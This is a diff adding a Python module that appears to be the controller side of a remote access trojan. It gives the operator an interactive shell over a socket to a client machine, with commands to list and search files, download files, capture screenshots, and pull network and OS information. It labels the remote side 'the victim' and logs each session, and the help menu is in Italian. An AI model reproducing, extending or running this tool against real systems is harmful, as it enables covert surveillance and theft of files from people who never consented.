@@ -1,0 +1,331 @@
+import os
+import time
+from generalServer import *
+from connectionServer import *
+
+
+def filespath(clientConnection):
+    global fileLog
+
+    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+        sleep(0.2)
+    print("Wait...")
+
+    try:
+        nomeFile = "FilesPath.txt"
+        file = open(nomeFile, 'ab')
+        newNBytes = ""
+        try:
+            filerecv = clientConnection.recv(1024)
+            try:
+                fileIf = filerecv.decode(FORMAT)
+            except:
+                fileIf = ""
+
+            if fileIf[0:7] != "[ERROR]":
+
+                scritti = 0
+                while (filerecv):
+                    scritti = scritti + file.write(filerecv)
+                    filerecv = clientConnection.recv(1024)
+                    if filerecv == b'[END]':
+                        filerecv = ''
+
+                file.close()
+
+                if os.path.getsize(nomeFile) <= 0:
+                    fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
+                    print(f"File created but not written correctly!\n")
+                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
+                                  ncols=50,
+                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
+
+                else:
+                    fileLog = fileLog + "\n" + f"File successfully created!\n"
+                    print(f"File successfully created!\n")
+                    time.sleep(2)
+            else:
+                raise Exception
+        except:
+            raise Exception
+    except:
+        #traceback.print_exc()
+        fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
+        print("Command Filespath gone wrong\n")
+
+
+# CONTROLLO REMOTO
+def remoteControl(clientConnection,buff):
+    while True:
+        try:
+            pathError=""
+            if buff[0:6]=="[PATH]":
+                pathError=buff
+                buff=""
+            else:
+                pathError = clientConnection.recv(1024).decode(FORMAT)
+
+            if pathError[0:7]=="[ERROR]":
+                path=clientConnection.recv(1024).decode(FORMAT)
+                print(path+"$ "+pathError)
+            else:
+                while pathError[0:6]!="[PATH]":
+                    pathError=pathError[1:]
+
+                path=pathError[6:]
+
+            comando = input(path + "$ ")
+            while comando == "":
+                comando = input(path + "$ ")
+
+            global fileLog
+            fileLog=fileLog+"\n"+path + "$ "+comando+"\n"
+
+            clientConnection.send((comando).encode(FORMAT))
+
+            if comando == "exit":
+                print(f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n")
+                fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n" + "\n"
+                break
+
+
+            elif comando[0:2] == "ls":
+                match= regexcheck_ls(comando)
+
+                if match:
+                    try:
+                        dato = clientConnection.recv(8000).decode(FORMAT)
+                        if dato[0:7]=="[ERROR]":
+                            raise Exception
+                        else:
+                            print(dato)
+                            fileLog = fileLog + "\n" + dato + "\n"
+                    except:
+                        #traceback.print_exc()
+                        print("\nAn error occurred, try again\n")
+                        fileLog = fileLog + "\n" + "An error occurred, try again...\n"
+
+                else:
+                    print("\nError, incorrect command")
+
+            elif comando == "pwd":
+                pwdresult = clientConnection.recv(1024).decode(FORMAT)
+                print("\"" + pwdresult + "\"")
+                fileLog = fileLog + "\n" + pwdresult + "\n"
+
+            # "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
+            elif comando[0:9] == "filespath":
+                filespath(clientConnection)
+
+            elif comando[0:4] == "find":
+
+                match = regexcheck_find(comando)
+
+                if match:
+
+                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
+                    print("Wait...")
+                    filesize = clientConnection.recv(1024).decode(FORMAT)
+
+                    dato = ('').encode(FORMAT)
+                    try:
+                        dato = dato + clientConnection.recv(int(filesize))
+                        print(dato.decode(FORMAT))
+                        fileLog = fileLog + "\n" + dato.decode(FORMAT) + "\n"
+                        for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Completing Operation", colour="green",
+                                      ncols=50,
+                                      bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                            sleep(0.2)
+                    except:
+                        #traceback.print_exc()
+                        fileLog = fileLog + "\n" + "Command Find gone wrong\n"
+                        print("Command Find gone wrong\n")
+                else:
+                    print("Wrong command!")
+            elif comando == "clear":
+                clearScreen()
+
+            elif comando == "help":
+                commandsHelp()
+
+            elif comando[0:2] == "cd":
+                pass
+
+            elif comando == "info":
+                output = clientConnection.recv(1024).decode(FORMAT)
+                print(output)
+                fileLog = fileLog + "\n" + output + "\n"
+
+            elif comando[0:8] == "download":
+                try:
+                    nomeFile=comando[10:len(comando) - 1]
+                    file = open(nomeFile, 'wb')
+                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading {nomeFile}...", colour="green",
+                                  ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
+
+                    filerecv = clientConnection.recv(1024)
+
+                    try:
+                        fileIf = filerecv.decode(FORMAT)
+                    except:
+                        fileIf = ""
+
+                    if fileIf[0:7]!="[ERROR]":
+
+                        scritti = 0
+                        while (filerecv):
+                            scritti = scritti + file.write(filerecv)
+                            filerecv = clientConnection.recv(1024)
+                            if filerecv == b'[END]':
+                                filerecv = ''
+
+                        file.close()
+
+                        if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
+                            fileLog = fileLog + "\n" + "Download failed\n" + "\n"
+                            print("Download failed\n")
+                            os.remove(nomeFile)
+                        elif scritti < os.path.getsize(nomeFile):
+                            fileLog = fileLog + "\n" + "Download failed\n" + "\n"
+                            print("Download fallito\n")
+                            os.remove(nomeFile)
+                        else:
+                            fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
+                            print(f"File {nomeFile} successfully downloaded\n")
+                        time.sleep(2)
+                    else:
+                        raise Exception
+                except:
+                    #traceback.print_exc()
+                    print("Download fallito\n")
+                    fileLog = fileLog + "\n" + "Download failed\n"
+
+            elif comando[0:4] == "rete" or comando[0:7]=="network":
+                try:
+                    dato = clientConnection.recv(10000).decode()
+                    if dato[0:7] == "[ERROR]":
+                        raise Exception
+                    else:
+                        print(dato)
+                        fileLog = fileLog + "\n" + dato +"\n"
+                except:
+                    #traceback.print_exc()
+                    print("\nAn error occurred, try again\n")
+                    fileLog = fileLog + "\n" + "An error occurred, try again...\n"
+
+            elif comando == "screenshot":
+                nomeFoto = input("Name of the screen (without extension): ")
+                nomeFoto=nomeFoto+".png"
+                fileLog = fileLog + "\n" + "Name of the screen (without extension): " + nomeFoto + "\n"
+
+                try:
+                    file = open(nomeFoto, 'wb')
+                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + "Downloading the .png file...", colour="green",
+                                  ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                        sleep(0.2)
+
+                    filerecv=clientConnection.recv(1024)
+                    try:
+                        fileIf=filerecv.decode(FORMAT)
+                    except:
+                        fileIf=""
+
+                    if fileIf[0:7] != "[ERROR]":
+                        scritti=0
+                        while(filerecv):
+                            scritti = scritti + file.write(filerecv)
+                            filerecv = clientConnection.recv(1024)
+                            if filerecv == b'[END]':
+                                filerecv=''
+
+                        file.close()
+
+                        if os.path.getsize(nomeFoto) <= 0:
+                            fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
+                            print("Screenshot failed\n")
+                            os.remove(nomeFoto)
+                        elif scritti < os.path.getsize(nomeFoto):
+                            fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
+                            print("Screenshot failed\n")
+                            os.remove(nomeFoto)
+                        else:
+                            fileLog = fileLog + "\n" + f"Screenshot successfully downloaded\n" + "\n"
+                            print(f"Screenshot successfully downloaded\n")
+                        time.sleep(2)
+                    else:
+                        raise Exception
+
+                except:
+                    #traceback.print_exc()
+                    print("Screenshot fallito\n")
+                    fileLog = fileLog + "\n" + "Screenshot failed\n"
+            else:
+               print("[ERROR] Command not found... \n")
+               fileLog = fileLog + "\n" + "[ERROR] Command not found... \n"
+
+        except Exception as e:
+            #traceback.print_exc()
+            if e.__class__.__name__ == "ConnectionResetError":
+                print(f"[ERROR] Connection Interrupted\n")
+                fileLog = fileLog + "\n" + "[ERROR] Connection Interrupted\n" + "\n"
+                raise e
+            else:
+                raise e
+
+
+# OK STAMPA INFO CLIENT
+def printInformazioni(clientConnection, addr):
+    buff = 1
+    risposta = "1"
+    nbytes = 1
+    newNBytes=""
+
+    global fileLog
+    print(f"\nInformation on the victim's Operating System:")
+    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System:" + "\n"
+    try:
+        while buff and nbytes != '':
+            nbytes = clientConnection.recv(256).decode(FORMAT)
+            if nbytes[0:1].isdigit():
+                while nbytes[0:1].isdigit():
+                    newNBytes = newNBytes + nbytes[0:1]
+                    nbytes = nbytes[1:]
+
+            buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
+            print("\n"+ buff)
+            fileLog=fileLog+"\n"+buff+"\n"
+
+            print(f"\n[DONE] Info received.\n")
+            fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"
+
+            if buff[0:6]=="[PATH]":
+                return buff
+            else:
+                return ""
+    except:
+        #traceback.print_exc()
+        print(f"[ERROR] Information not received\n")
+        fileLog = fileLog + "\n" + f"[ERROR] Information not received\n" + "\n"
+        raise Exception
+
+def commandsHelp():
+    print(
+        f"\n#####                                       Comandi disponibili                                                     ####")
+    print()
+    print(
+        f"Download di file:                           download <\"nomeFile.estensione\"> (txt docx pdf video foto excel cartelle zip ")
+    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
+    print(f"Mostra Working Directory:                   pwd")
+    print(f"Lista dei file in un percorso:              ls <Path>")
+    print(f"Cambia la Working Directory:                cd <Path>")
+    print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
+    print(f"Effettua screenshot:                        screenshot")
+    print(f"Esci dal controllo remoto:                  exit")
+    print(f"Ripulisci terminale:                        clear")
+    print(f"Informazioni ifconfig/ipconfig:             rete/network")
+    print(f"Informazioni so client:                     info")
+    print()
+    print("####################################\n")
